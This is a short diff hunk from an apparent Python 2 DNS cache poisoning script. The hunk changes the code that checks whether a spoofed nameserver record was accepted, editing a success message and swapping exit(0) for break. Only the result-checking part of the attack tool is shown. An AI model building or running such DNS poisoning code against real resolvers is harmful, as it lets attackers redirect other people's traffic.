@@ -95,8 +95,8 @@ def attack():
         response = DNS(response)
         try:
             if response[DNS].ns[0].rdata == spoof:
-                print "Successfully poisonned our target with a dummy record !!"
-                exit(0)
+                print "Successfully poisonned our target with a dummy record!"
+                break
             else:
                 print "Poisonning on %s failed, ns is %s" % (url, str(response[DNS].ns))
         except:
